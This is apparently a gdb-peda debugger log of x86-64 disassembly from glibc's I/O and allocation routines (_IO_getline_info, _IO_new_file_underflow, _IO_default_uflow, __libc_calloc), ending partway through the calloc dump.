   0x00007ffff745001d <+173>: je     0x7ffff74500b1 <_IO_getline_info+321>

   0x00007ffff7450023 <+179>: cmp    eax,r12d
   0x00007ffff7450026 <+182>: je     0x7ffff74500cd <_IO_getline_info+349>

   0x00007ffff745002c <+188>: sub    rbp,0x1
   0x00007ffff7450030 <+192>: mov    BYTE PTR [r15],al
   0x00007ffff7450033 <+195>: add    r15,0x1
   0x00007ffff7450037 <+199>: test   rbp,rbp
   0x00007ffff745003a <+202>: jne    0x7ffff7450002 <_IO_getline_info+146>

   0x00007ffff745003c <+204>: nop    DWORD PTR [rax+0x0]
   0x00007ffff7450040 <+208>: mov    rax,r15
   0x00007ffff7450043 <+211>: sub    rax,QWORD PTR [rsp+0x8]
   0x00007ffff7450048 <+216>: add    rsp,0x28
   0x00007ffff745004c <+220>: pop    rbx
   0x00007ffff745004d <+221>: pop    rbp
   0x00007ffff745004e <+222>: pop    r12
   0x00007ffff7450050 <+224>: pop    r13
   0x00007ffff7450052 <+226>: pop    r14
   0x00007ffff7450054 <+228>: pop    r15
   0x00007ffff7450056 <+230>: ret    


   0x00007ffff7450057 <+231>: nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7450060 <+240>: mov    rbp,rax
   0x00007ffff7450063 <+243>: mov    eax,DWORD PTR [rsp+0x1c]
   0x00007ffff7450067 <+247>: mov    r12,r15
   0x00007ffff745006a <+250>: sub    rbp,r14
   0x00007ffff745006d <+253>: sub    r12,QWORD PTR [rsp+0x8]
   0x00007ffff7450072 <+258>: test   eax,eax
   0x00007ffff7450074 <+260>: js     0x7ffff7450083 <_IO_getline_info+275>

   0x00007ffff7450076 <+262>: add    rcx,0x1
   0x00007ffff745007a <+266>: cmp    DWORD PTR [rsp+0x1c],0x1
   0x00007ffff745007f <+271>: sbb    rbp,0xffffffffffffffff
   0x00007ffff7450083 <+275>: mov    rdx,rbp
   0x00007ffff7450086 <+278>: mov    rsi,r14
   0x00007ffff7450089 <+281>: mov    rdi,r15
   0x00007ffff745008c <+284>: mov    QWORD PTR [rsp],rcx
   0x00007ffff7450090 <+288>: call   0x7ffff7471760 <__memcpy_sse2>
   0x00007ffff7450095. <+293>: mov    rcx,QWORD PTR [rsp]
   0x00007ffff7450099 <+297>: lea    rax,[rbp+r12*1+0x0]
   0x00007ffff745009e <+302>: mov    QWORD PTR [rbx+0x8],rcx
   0x00007ffff74500a2. <+306>: add    rsp,0x28
   0x00007ffff74500a6 <+310>: pop    rbx
   0x00007ffff74500a7 <+311>: pop    rbp
   0x00007ffff74500a8 <+312>: pop    r12
   0x00007ffff74500aa <+314>: pop    r13
   0x00007ffff74500ac <+316>: pop    r14
   0x00007ffff74500ae- <+318>: pop    r15
   0x00007ffff74500b0. <+320>: ret    


   0x00007ffff74500b1 <+321>: cmp    QWORD PTR [rsp+0x10],0x0
   0x00007ffff74500b7 <+327>: je     0x7ffff7450040 <_IO_getline_info+208>

   0x00007ffff74500b9 <+329>: mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff74500be <+334>: mov    DWORD PTR [rdx],eax
   0x00007ffff74500c0 <+336>: mov    rax,r15
   0x00007ffff74500c3 <+339>: sub    rax,QWORD PTR [rsp+0x8]
   0x00007ffff74500c8 <+344>: jmp    0x7ffff7450048 <_IO_getline_info+216>


   0x00007ffff74500cd <+349>: cmp    DWORD PTR [rsp+0x1c],0x0
   0x00007ffff74500d2 <+354>: jle    0x7ffff74500e0 <_IO_getline_info+368>

   0x00007ffff74500d4 <+356>: mov    BYTE PTR [r15],r12b
   0x00007ffff74500d7 <+359>: add    r15,0x1
   0x00007ffff74500db <+363>: jmp    0x7ffff7450040 <_IO_getline_info+208>


   0x00007ffff74500e0 <+368>: je     0x7ffff7450040 <_IO_getline_info+208>

   0x00007ffff74500e6 <+374>: mov    esi,r12d
   0x00007ffff74500e9 <+377>: mov    rdi,rbx
   0x00007ffff74500ec <+380>: call   0x7ffff745c4c0 <_IO_sputbackc>
   0x00007ffff74500f1 <+385>: jmp    0x7ffff7450040 <_IO_getline_info+208>


   0x00007ffff74500f6 <+390>: mov    DWORD PTR [rbx+0xc0],0xffffffff
   0x00007ffff7450100 <+400>: jmp    0x7ffff744ffb0 <_IO_getline_info+64>
   0x00007ffff7450105 : [next ins..]
--------------------------------
End of assembler dump.
gdb-peda$ disas 0x7ffff745ae88
Dump of assembler code for function _IO_new_file_underflow:
---------------------
   0x00007ffff745ad60 <+0>: push   rbp
   0x00007ffff745ad61 <+1>: push   rbx
   0x00007ffff745ad62 <+2>: mov    rbx,rdi
   0x00007ffff745ad65 <+5>: sub    rsp,0x8
   0x00007ffff745ad69 <+9>: mov    eax,DWORD PTR [rdi]
   0x00007ffff745ad6b <+11>:  test   al,0x4
   0x00007ffff745ad6d <+13>:  jne    0x7ffff745af30 <_IO_new_file_underflow+464>

   0x00007ffff745ad73 <+19>:  mov    rdx,QWORD PTR [rdi+0x8]
   0x00007ffff745ad77 <+23>:  cmp    rdx,QWORD PTR [rdi+0x10]
   0x00007ffff745ad7b <+27>:  jb     0x7ffff745aec0 <_IO_new_file_underflow+352>

   0x00007ffff745ad81 <+33>:  cmp    QWORD PTR [rdi+0x38],0x0
   0x00007ffff745ad86 <+38>:  je     0x7ffff745aee8 <_IO_new_file_underflow+392>

   0x00007ffff745ad8c <+44>:  test   eax,0x202
   0x00007ffff745ad91 <+49>:  je     0x7ffff745ae50 <_IO_new_file_underflow+240>

   0x00007ffff745ad97 <+55>:  mov    rbp,QWORD PTR [rip+0x33ea92]        # 0x7ffff7799830 <stdout>
   0x00007ffff745ad9e <+62>:  mov    edx,DWORD PTR [rbp+0x0]
   0x00007ffff745ada1 <+65>:  mov    rdi,rbp
   0x00007ffff745ada4 <+68>:  mov    eax,edx
   0x00007ffff745ada6 <+70>:  and    eax,0x8000
   0x00007ffff745adab <+75>:  jne    0x7ffff745adfe <_IO_new_file_underflow+158>

   0x00007ffff745adad <+77>:  mov    rdx,QWORD PTR [rbp+0x88]
   0x00007ffff745adb4 <+84>:  mov    r8,QWORD PTR fs:0x10
   0x00007ffff745adbd <+93>:  cmp    r8,QWORD PTR [rdx+0x8]
   0x00007ffff745adc1 <+97>:  je     0x7ffff745adf8 <_IO_new_file_underflow+152>

   0x00007ffff745adc3 <+99>:  mov    esi,0x1
   0x00007ffff745adc8 <+104>: cmp    DWORD PTR [rip+0x3433e5],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff745adcf <+111>: je     0x7ffff745addd <_IO_new_file_underflow+125>

   0x00007ffff745add1 <+113>: lock cmpxchg DWORD PTR [rdx],esi
   0x00007ffff745add5 <+117>: jne    0x7ffff745b3b9 <_L_lock_4054>

   0x00007ffff745addb <+123>: jmp    0x7ffff745ade6 <_IO_new_file_underflow+134>


   0x00007ffff745addd <+125>: cmpxchg DWORD PTR [rdx],esi
   0x00007ffff745ade0 <+128>: jne    0x7ffff745b3b9 <_L_lock_4054>

   0x00007ffff745ade6 <+134>: mov    rdx,QWORD PTR [rbp+0x88]
   0x00007ffff745aded <+141>: mov    rdi,QWORD PTR [rip+0x33ea3c]        # 0x7ffff7799830 <stdout>
   0x00007ffff745adf4 <+148>: mov    QWORD PTR [rdx+0x8],r8
   0x00007ffff745adf8 <+152>: add    DWORD PTR [rdx+0x4],0x1
   0x00007ffff745adfc <+156>: mov    edx,DWORD PTR [rdi]
   0x00007ffff745adfe <+158>: and    edx,0x288
   0x00007ffff745ae04 <+164>: cmp    edx,0x280
   0x00007ffff745ae0a <+170>: je     0x7ffff745af18 <_IO_new_file_underflow+440>

   0x00007ffff745ae10 <+176>: mov    eax,DWORD PTR [rbp+0x0]
   0x00007ffff745ae13 <+179>: test   ah,0x80
   0x00007ffff745ae16 <+182>: jne    0x7ffff745ae50 <_IO_new_file_underflow+240>

   0x00007ffff745ae18 <+184>: mov    rdx,QWORD PTR [rbp+0x88]
   0x00007ffff745ae1f <+191>: mov    eax,DWORD PTR [rdx+0x4]
   0x00007ffff745ae22 <+194>: sub    eax,0x1
   0x00007ffff745ae25 <+197>: test   eax,eax
   0x00007ffff745ae27 <+199>: mov    DWORD PTR [rdx+0x4],eax
   0x00007ffff745ae2a <+202>: jne    0x7ffff745ae50 <_IO_new_file_underflow+240>

   0x00007ffff745ae2c <+204>: mov    QWORD PTR [rdx+0x8],0x0
   0x00007ffff745ae34 <+212>: cmp    DWORD PTR [rip+0x343379],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff745ae3b <+219>: je     0x7ffff745ae48 <_IO_new_file_underflow+232>

   0x00007ffff745ae3d <+221>: lock dec DWORD PTR [rdx]
   0x00007ffff745ae40 <+224>: jne    0x7ffff745b3d4 <_L_unlock_4094>

   0x00007ffff745ae46 <+230>: jmp    0x7ffff745ae50 <_IO_new_file_underflow+240>


   0x00007ffff745ae48 <+232>: dec    DWORD PTR [rdx]
   0x00007ffff745ae4a <+234>: jne    0x7ffff745b3d4 <_L_unlock_4094>

   0x00007ffff745ae50 <+240>: mov    rdi,rbx
   0x00007ffff745ae53 <+243>: call   0x7ffff745bb70 <_IO_switch_to_get_mode>
   0x00007ffff745ae58 <+248>: mov    rsi,QWORD PTR [rbx+0x38]
   0x00007ffff745ae5c <+252>: mov    rdx,QWORD PTR [rbx+0x40]
   0x00007ffff745ae60 <+256>: mov    rdi,rbx
   0x00007ffff745ae63 <+259>: mov    rax,QWORD PTR [rbx+0xd8]
   0x00007ffff745ae6a <+266>: sub    rdx,rsi
   0x00007ffff745ae6d <+269>: mov    QWORD PTR [rbx+0x8],rsi
   0x00007ffff745ae71 <+273>: mov    QWORD PTR [rbx+0x18],rsi
   0x00007ffff745ae75 <+277>: mov    QWORD PTR [rbx+0x10],rsi
   0x00007ffff745ae79 <+281>: mov    QWORD PTR [rbx+0x30],rsi
   0x00007ffff745ae7d <+285>: mov    QWORD PTR [rbx+0x28],rsi
   0x00007ffff745ae81 <+289>: mov    QWORD PTR [rbx+0x20],rsi
   0x00007ffff745ae85 <+293>: call   QWORD PTR [rax+0x70]
   0x00007ffff745ae88. <+296>: cmp    rax,0x0
   0x00007ffff745ae8c <+300>: jle    0x7ffff745aed0 <_IO_new_file_underflow+368>

   0x00007ffff745ae8e <+302>: mov    rdx,QWORD PTR [rbx+0x90]
   0x00007ffff745ae95 <+309>: add    QWORD PTR [rbx+0x10],rax
   0x00007ffff745ae99 <+313>: cmp    rdx,0xffffffffffffffff
   0x00007ffff745ae9d <+317>: je     0x7ffff745aea9 <_IO_new_file_underflow+329>

   0x00007ffff745ae9f <+319>: add    rax,rdx
   0x00007ffff745aea2 <+322>: mov    QWORD PTR [rbx+0x90],rax
   0x00007ffff745aea9 <+329>: mov    rax,QWORD PTR [rbx+0x8]
   0x00007ffff745aead <+333>: movzx  eax,BYTE PTR [rax]
   0x00007ffff745aeb0. <+336>: add    rsp,0x8
   0x00007ffff745aeb4 <+340>: pop    rbx
   0x00007ffff745aeb5 <+341>: pop    rbp
   0x00007ffff745aeb6 <+342>: ret    


   0x00007ffff745aeb7 <+343>: nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff745aec0 <+352>: movzx  eax,BYTE PTR [rdx]
   0x00007ffff745aec3 <+355>: add    rsp,0x8
   0x00007ffff745aec7 <+359>: pop    rbx
   0x00007ffff745aec8 <+360>: pop    rbp
   0x00007ffff745aec9 <+361>: ret    


   0x00007ffff745aeca <+362>: nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff745aed0 <+368>: mov    eax,DWORD PTR [rbx]
   0x00007ffff745aed2 <+370>: jne    0x7ffff745af10 <_IO_new_file_underflow+432>

   0x00007ffff745aed4 <+372>: or     eax,0x10
   0x00007ffff745aed7 <+375>: mov    DWORD PTR [rbx],eax
   0x00007ffff745aed9 <+377>: add    rsp,0x8
   0x00007ffff745aedd <+381>: mov    eax,0xffffffff
   0x00007ffff745aee2 <+386>: pop    rbx
   0x00007ffff745aee3 <+387>: pop    rbp
   0x00007ffff745aee4 <+388>: ret    


   0x00007ffff745aee5 <+389>: nop    DWORD PTR [rax]
   0x00007ffff745aee8 <+392>: mov    rdi,QWORD PTR [rdi+0x48]
   0x00007ffff745aeec <+396>: test   rdi,rdi
   0x00007ffff745aeef <+399>: je     0x7ffff745aefc <_IO_new_file_underflow+412>

   0x00007ffff745aef1 <+401>: call   0x7ffff73fffe0 <free@plt+32>
   0x00007ffff745aef6 <+406>: and    DWORD PTR [rbx],0xfffffeff
   0x00007ffff745aefc <+412>: mov    rdi,rbx
   0x00007ffff745aeff <+415>: call   0x7ffff745be60 <_IO_doallocbuf>
   0x00007ffff745af04 <+420>: mov    eax,DWORD PTR [rbx]
   0x00007ffff745af06 <+422>: jmp    0x7ffff745ad8c <_IO_new_file_underflow+44>


   0x00007ffff745af0b <+427>: nop    DWORD PTR [rax+rax*1+0x0]
   0x00007ffff745af10 <+432>: or     eax,0x20
   0x00007ffff745af13 <+435>: jmp    0x7ffff745aed7 <_IO_new_file_underflow+375>


   0x00007ffff745af15 <+437>: nop    DWORD PTR [rax]
   0x00007ffff745af18 <+440>: mov    rax,QWORD PTR [rdi+0xd8]
   0x00007ffff745af1f <+447>: mov    esi,0xffffffff
   0x00007ffff745af24 <+452>: call   QWORD PTR [rax+0x18]
   0x00007ffff745af27 <+455>: jmp    0x7ffff745ae10 <_IO_new_file_underflow+176>


   0x00007ffff745af2c <+460>: nop    DWORD PTR [rax+0x0]
   0x00007ffff745af30 <+464>: or     eax,0x20
   0x00007ffff745af33 <+467>: mov    DWORD PTR [rdi],eax
   0x00007ffff745af35 <+469>: mov    rax,QWORD PTR [rip+0x33cee4]        # 0x7ffff7797e20
   0x00007ffff745af3c <+476>: mov    DWORD PTR fs:[rax],0x9
   0x00007ffff745af43 <+483>: mov    eax,0xffffffff
   0x00007ffff745af48 <+488>: jmp    0x7ffff745aeb0 <_IO_new_file_underflow+336>


   0x00007ffff745af4d <+493>: mov    rsi,rax
   0x00007ffff745af50 <+496>: mov    eax,DWORD PTR [rbp+0x0]
   0x00007ffff745af53 <+499>: test   ah,0x80
   0x00007ffff745af56 <+502>: jne    0x7ffff745af90 <_IO_new_file_underflow+560>

   0x00007ffff745af58 <+504>: mov    rdx,QWORD PTR [rbp+0x88]
   0x00007ffff745af5f <+511>: mov    eax,DWORD PTR [rdx+0x4]
   0x00007ffff745af62 <+514>: sub    eax,0x1
   0x00007ffff745af65 <+517>: test   eax,eax
   0x00007ffff745af67 <+519>: mov    DWORD PTR [rdx+0x4],eax
   0x00007ffff745af6a <+522>: jne    0x7ffff745af90 <_IO_new_file_underflow+560>

   0x00007ffff745af6c <+524>: mov    QWORD PTR [rdx+0x8],0x0
   0x00007ffff745af74 <+532>: cmp    DWORD PTR [rip+0x343239],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff745af7b <+539>: je     0x7ffff745af88 <_IO_new_file_underflow+552>

   0x00007ffff745af7d <+541>: lock dec DWORD PTR [rdx]
   0x00007ffff745af80 <+544>: jne    0x7ffff745b3ef <_L_unlock_4268>

   0x00007ffff745af86 <+550>: jmp    0x7ffff745af90 <_IO_new_file_underflow+560>


   0x00007ffff745af88 <+552>: dec    DWORD PTR [rdx]
   0x00007ffff745af8a <+554>: jne    0x7ffff745b3ef <_L_unlock_4268>

   0x00007ffff745af90 <+560>: mov    rdi,rsi
   0x00007ffff745af93 <+563>: call   0x7ffff74029b0 <_Unwind_Resume>

   0x00007ffff745af98 : [next ins..]
--------------------------------
End of assembler dump.
gdb-peda$ disas 0x7ffff745bece
Dump of assembler code for function _IO_default_uflow:
-----------------------
   0x00007ffff745bec0 <+0>: mov    rax,QWORD PTR [rdi+0xd8]
   0x00007ffff745bec7 <+7>: push   rbx
   0x00007ffff745bec8 <+8>: mov    rbx,rdi
   0x00007ffff745becb <+11>:  call   QWORD PTR [rax+0x20]
   0x00007ffff745bece <+14>:  cmp    eax,0xffffffff
   0x00007ffff745bed1 <+17>:  je     0x7ffff745bee2 <_IO_default_uflow+34>

   0x00007ffff745bed3 <+19>:  mov    rdx,QWORD PTR [rbx+0x8]
   0x00007ffff745bed7 <+23>:  movzx  eax,BYTE PTR [rdx]
   0x00007ffff745beda <+26>:  add    rdx,0x1
   0x00007ffff745bede <+30>:  mov    QWORD PTR [rbx+0x8],rdx
   0x00007ffff745bee2 <+34>:  pop    rbx
   0x00007ffff745bee3 <+35>:  ret    

   0x00007ffff745bee4 : [next ins..]
------------------------------
End of assembler dump.
gdb-peda$ disas 0x7ffff74644aa
Dump of assembler code for function __libc_calloc:
   0x00007ffff74641e0 <+0>: mov    rdx,rsi
   0x00007ffff74641e3 <+3>: mov    QWORD PTR [rsp-0x28],rbp
   0x00007ffff74641e8 <+8>: mov    eax,0xffffffff
   0x00007ffff74641ed <+13>:  mov    rbp,rsi
   0x00007ffff74641f0 <+16>:  or     rdx,rdi
   0x00007ffff74641f3 <+19>:  mov    QWORD PTR [rsp-0x30],rbx
   0x00007ffff74641f8 <+24>:  mov    QWORD PTR [rsp-0x20],r12
   0x00007ffff74641fd <+29>:  mov    QWORD PTR [rsp-0x18],r13
   0x00007ffff7464202 <+34>:  mov    QWORD PTR [rsp-0x10],r14
   0x00007ffff7464207 <+39>:  mov    QWORD PTR [rsp-0x8],r15
   0x00007ffff746420c <+44>:  sub    rsp,0x38
   0x00007ffff7464210 <+48>:  imul   rbp,rdi
   0x00007ffff7464214 <+52>:  cmp    rdx,rax
   0x00007ffff7464217 <+55>:  ja     0x7ffff746459c <__libc_calloc+956>

   0x00007ffff746421d <+61>:  mov    rax,QWORD PTR [rip+0x333c7c]        # 0x7ffff7797ea0
   0x00007ffff7464224 <+68>:  mov    rax,QWORD PTR [rax]
   0x00007ffff7464227 <+71>:  test   rax,rax
   0x00007ffff746422a <+74>:  jne    0x7ffff7464557 <__libc_calloc+887>

   0x00007ffff7464230 <+80>:  mov    rax,QWORD PTR [rip+0x333ae9]        # 0x7ffff7797d20
   0x00007ffff7464237 <+87>:  mov    r12,QWORD PTR fs:[rax]
   0x00007ffff746423b <+91>:  test   r12,r12
   0x00007ffff746423e <+94>:  je     0x7ffff74644b0 <__libc_calloc+720>

   0x00007ffff7464244 <+100>: mov    esi,0x1
   0x00007ffff7464249 <+105>: xor    eax,eax
   0x00007ffff746424b <+107>: cmp    DWORD PTR [rip+0x339f62],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff7464252 <+114>: je     0x7ffff7464262 <__libc_calloc+130>

   0x00007ffff7464254 <+116>: lock cmpxchg DWORD PTR [r12],esi
   0x00007ffff746425a <+122>: jne    0x7ffff74654a0 <_L_lock_13262>

   0x00007ffff7464260 <+128>: jmp    0x7ffff746426d <__libc_calloc+141>


   0x00007ffff7464262 <+130>: cmpxchg DWORD PTR [r12],esi
   0x00007ffff7464267 <+135>: jne    0x7ffff74654a0 <_L_lock_13262>

   0x00007ffff746426d <+141>: mov    r14,QWORD PTR [r12+0x58]
   0x00007ffff7464272 <+146>: lea    r15,[rip+0x3344a7]        # 0x7ffff7798720 <main_arena>
   0x00007ffff7464279 <+153>: mov    r13,QWORD PTR [r14+0x8]
   0x00007ffff746427d <+157>: and    r13,0xfffffffffffffff8
   0x00007ffff7464281 <+161>: cmp    r12,r15
   0x00007ffff7464284 <+164>: je     0x7ffff746429d <__libc_calloc+189>

   0x00007ffff7464286 <+166>: mov    rax,r14
   0x00007ffff7464289 <+169>: and    rax,0xfffffffffc000000
   0x00007ffff746428f <+175>: add    rax,QWORD PTR [rax+0x18]
   0x00007ffff7464293 <+179>: sub    rax,r14
   0x00007ffff7464296 <+182>: cmp    r13,rax
   0x00007ffff7464299 <+185>: cmovb  r13,rax
   0x00007ffff746429d <+189>: mov    rsi,rbp
   0x00007ffff74642a0 <+192>: mov    rdi,r12
   0x00007ffff74642a3 <+195>: call   0x7ffff7460190 <_int_malloc>
   0x00007ffff74642a8 <+200>: test   rax,rax
   0x00007ffff74642ab <+203>: mov    rbx,rax
   0x00007ffff74642ae <+206>: je     0x7ffff7464400 <__libc_calloc+544>

   0x00007ffff74642b4 <+212>: mov    rax,QWORD PTR [rax-0x8]
   0x00007ffff74642b8 <+216>: test   al,0x2
   0x00007ffff74642ba <+218>: jne    0x7ffff74642dd <__libc_calloc+253>

   0x00007ffff74642bc <+220>: test   al,0x4
   0x00007ffff74642be <+222>: lea    rdx,[rip+0x33445b]        # 0x7ffff7798720 <main_arena>
   0x00007ffff74642c5 <+229>: je     0x7ffff74642d4 <__libc_calloc+244>

   0x00007ffff74642c7 <+231>: lea    rax,[rbx-0x10]
   0x00007ffff74642cb <+235>: and    rax,0xfffffffffc000000
   0x00007ffff74642d1 <+241>: mov    rdx,QWORD PTR [rax]
   0x00007ffff74642d4 <+244>: cmp    rdx,r12
   0x00007ffff74642d7 <+247>: jne    0x7ffff74644de <__libc_calloc+766>

   0x00007ffff74642dd <+253>: cmp    DWORD PTR [rip+0x339ed0],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff74642e4 <+260>: je     0x7ffff74642f3 <__libc_calloc+275>

   0x00007ffff74642e6 <+262>: lock dec DWORD PTR [r12]
   0x00007ffff74642eb <+267>: jne    0x7ffff74654bc <_L_unlock_13328>

   0x00007ffff74642f1 <+273>: jmp    0x7ffff74642fd <__libc_calloc+285>


   0x00007ffff74642f3 <+275>: dec    DWORD PTR [r12]
   0x00007ffff74642f7 <+279>: jne    0x7ffff74654bc <_L_unlock_13328>

   0x00007ffff74642fd <+285>: mov    rdx,QWORD PTR [rbx-0x8]
   0x00007ffff7464301 <+289>: test   dl,0x2
   0x00007ffff7464304 <+292>: je     0x7ffff7464340 <__libc_calloc+352>

   0x00007ffff7464306 <+294>: mov    r12d,DWORD PTR [rip+0x336813]        # 0x7ffff779ab20 <perturb_byte>
   0x00007ffff746430d <+301>: test   r12d,r12d
   0x00007ffff7464310 <+304>: jne    0x7ffff74645ea <__libc_calloc+1034>

   0x00007ffff7464316 <+310>: mov    rax,rbx
   0x00007ffff7464319 <+313>: mov    rbp,QWORD PTR [rsp+0x10]
   0x00007ffff746431e <+318>: mov    rbx,QWORD PTR [rsp+0x8]
   0x00007ffff7464323 <+323>: mov    r12,QWORD PTR [rsp+0x18]
   0x00007ffff7464328 <+328>: mov    r13,QWORD PTR [rsp+0x20]
   0x00007ffff746432d <+333>: mov    r14,QWORD PTR [rsp+0x28]
   0x00007ffff7464332 <+338>: mov    r15,QWORD PTR [rsp+0x30]
   0x00007ffff7464337 <+343>: add    rsp,0x38
   0x00007ffff746433b <+347>: ret    


   0x00007ffff746433c <+348>: nop    DWORD PTR [rax+0x0]
   0x00007ffff7464340 <+352>: mov    r11d,DWORD PTR [rip+0x3367d9]        # 0x7ffff779ab20 <perturb_byte>
   0x00007ffff7464347 <+359>: and    rdx,0xfffffffffffffff8
   0x00007ffff746434b <+363>: test   r11d,r11d
   0x00007ffff746434e <+366>: jne    0x7ffff746435d <__libc_calloc+381>

   0x00007ffff7464350 <+368>: lea    rax,[rbx-0x10]
   0x00007ffff7464354 <+372>: cmp    r14,rax
   0x00007ffff7464357 <+375>: je     0x7ffff74643f0 <__libc_calloc+528>

   0x00007ffff746435d <+381>: sub    rdx,0x8
   0x00007ffff7464361 <+385>: mov    rax,rdx
   0x00007ffff7464364 <+388>: shr    rax,0x3
   0x00007ffff7464368 <+392>: cmp    rax,0x2
   0x00007ffff746436c <+396>: jbe    0x7ffff74645cb <__libc_calloc+1003>

   0x00007ffff7464372 <+402>: cmp    rax,0x9
   0x00007ffff7464376 <+406>: ja     0x7ffff74644a0 <__libc_calloc+704>

   0x00007ffff746437c <+412>: cmp    rax,0x4
   0x00007ffff7464380 <+416>: mov    QWORD PTR [rbx],0x0
   0x00007ffff7464387 <+423>: mov    QWORD PTR [rbx+0x8],0x0
   0x00007ffff746438f <+431>: mov    QWORD PTR [rbx+0x10],0x0
   0x00007ffff7464397 <+439>: jbe    0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff746439d <+445>: cmp    rax,0x6
   0x00007ffff74643a1 <+449>: mov    QWORD PTR [rbx+0x18],0x0
   0x00007ffff74643a9 <+457>: mov    QWORD PTR [rbx+0x20],0x0
   0x00007ffff74643b1 <+465>: jbe    0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff74643b7 <+471>: cmp    rax,0x9
   0x00007ffff74643bb <+475>: mov    QWORD PTR [rbx+0x28],0x0
   0x00007ffff74643c3 <+483>: mov    QWORD PTR [rbx+0x30],0x0
   0x00007ffff74643cb <+491>: jne    0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff74643d1 <+497>: mov    QWORD PTR [rbx+0x38],0x0
   0x00007ffff74643d9 <+505>: mov    QWORD PTR [rbx+0x40],0x0
   0x00007ffff74643e1 <+513>: jmp    0x7ffff7464316 <__libc_calloc+310>


   0x00007ffff74643e6 <+518>: nop    WORD PTR cs:[rax+rax*1+0x0]
   0x00007ffff74643f0 <+528>: cmp    rdx,r13
   0x00007ffff74643f3 <+531>: cmova  rdx,r13
   0x00007ffff74643f7 <+535>: jmp    0x7ffff746435d <__libc_calloc+381>


   0x00007ffff74643fc <+540>: nop    DWORD PTR [rax+0x0]
   0x00007ffff7464400 <+544>: cmp    DWORD PTR [rip+0x339dad],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff7464407 <+551>: je     0x7ffff7464416 <__libc_calloc+566>

   0x00007ffff7464409 <+553>: lock dec DWORD PTR [r12]
   0x00007ffff746440e <+558>: jne    0x7ffff74654d8 <_L_unlock_13445>

   0x00007ffff7464414 <+564>: jmp    0x7ffff7464420 <__libc_calloc+576>


   0x00007ffff7464416 <+566>: dec    DWORD PTR [r12]
   0x00007ffff746441a <+570>: jne    0x7ffff74654d8 <_L_unlock_13445>

   0x00007ffff7464420 <+576>: cmp    r12,r15
   0x00007ffff7464423 <+579>: je     0x7ffff7464500 <__libc_calloc+800>

   0x00007ffff7464429 <+585>: mov    esi,0x1
   0x00007ffff746442e <+590>: xor    eax,eax
   0x00007ffff7464430 <+592>: cmp    DWORD PTR [rip+0x339d7d],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff7464437 <+599>: je     0x7ffff7464449 <__libc_calloc+617>

   0x00007ffff7464439 <+601>: lock cmpxchg DWORD PTR [rip+0x3342df],esi        # 0x7ffff7798720 <main_arena>
   0x00007ffff7464441 <+609>: jne    0x7ffff74654f4 <_L_lock_13454>

   0x00007ffff7464447 <+615>: jmp    0x7ffff7464456 <__libc_calloc+630>


   0x00007ffff7464449 <+617>: cmpxchg DWORD PTR [rip+0x3342d0],esi        # 0x7ffff7798720 <main_arena>
   0x00007ffff7464450 <+624>: jne    0x7ffff74654f4 <_L_lock_13454>

   0x00007ffff7464456 <+630>: lea    rdi,[rip+0x3342c3]        # 0x7ffff7798720 <main_arena>
   0x00007ffff746445d <+637>: mov    rsi,rbp
   0x00007ffff7464460 <+640>: call   0x7ffff7460190 <_int_malloc>
   0x00007ffff7464465 <+645>: mov    rbx,rax
   0x00007ffff7464468 <+648>: cmp    DWORD PTR [rip+0x339d45],0x0        # 0x7ffff779e1b4 <__libc_multiple_threads>
   0x00007ffff746446f <+655>: je     0x7ffff7464480 <__libc_calloc+672>

   0x00007ffff7464471 <+657>: lock dec DWORD PTR [rip+0x3342a8]        # 0x7ffff7798720 <main_arena>
   0x00007ffff7464478 <+664>: jne    0x7ffff7465513 <_L_unlock_13463>

   0x00007ffff746447e <+670>: jmp    0x7ffff746448c <__libc_calloc+684>


   0x00007ffff7464480 <+672>: dec    DWORD PTR [rip+0x33429a]        # 0x7ffff7798720 <main_arena>
   0x00007ffff7464486 <+678>: jne    0x7ffff7465513 <_L_unlock_13463>

   0x00007ffff746448c <+684>: test   rbx,rbx
   0x00007ffff746448f <+687>: jne    0x7ffff74642fd <__libc_calloc+285>

   0x00007ffff7464495 <+693>: jmp    0x7ffff7464316 <__libc_calloc+310>


   0x00007ffff746449a <+698>: nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff74644a0 <+704>: xor    esi,esi
   0x00007ffff74644a2 <+706>: mov    rdi,rbx
   0x00007ffff74644a5 <+709>: call   0x7ffff746bb80 <__memset_sse2>
   0x00007ffff74644aa <+714>: jmp    0x7ffff7464316 <__libc_calloc+310>

   0x00007ffff74644af <+719>: nop
   0x00007ffff74644b0 <+720>: call   0x7ffff745dc30 <get_free_list>
   0x00007ffff74644b5 <+725>: test   rax,rax
   0x00007ffff74644b8 <+728>: mov    r12,rax

   0x00007ffff74644bb <+731>: jne    0x7ffff746426d <__libc_calloc+141>
   0x00007ffff74644c1 <+737>: xor    esi,esi
   0x00007ffff74644c3 <+739>: mov    rdi,rbp
   0x00007ffff74644c6 <+742>: call   0x7ffff745eee0 <arena_get2>
   0x00007ffff74644cb <+747>: test   rax,rax
   0x00007ffff74644ce <+750>: mov    r12,rax
   0x00007ffff74644d1 <+753>: jne    0x7ffff746426d <__libc_calloc+141>

   0x00007ffff74644d7 <+759>: xor    ebx,ebx
   0x00007ffff74644d9 <+761>: jmp    0x7ffff7464316 <__libc_calloc+310>


   0x00007ffff74644de <+766>: lea    rcx,[rip+0xf6a7d]        # 0x7ffff755af62 <__func__.12858>
   0x00007ffff74644e5 <+773>: lea    rsi,[rip+0xf66ed]        # 0x7ffff755abd9
   0x00007ffff74644ec <+780>: lea    rdi,[rip+0xfaa4d]        # 0x7ffff755ef40
   0x00007ffff74644f3 <+787>: mov    edx,0xcf5
   0x00007ffff74644f8 <+792>: call   0x7ffff745df80 <__malloc_assert>
   0x00007ffff74644fd <+797>: nop    DWORD PTR [rax]
   0x00007ffff7464500 <+800>: call   0x7ffff745dc30 <get_free_list>
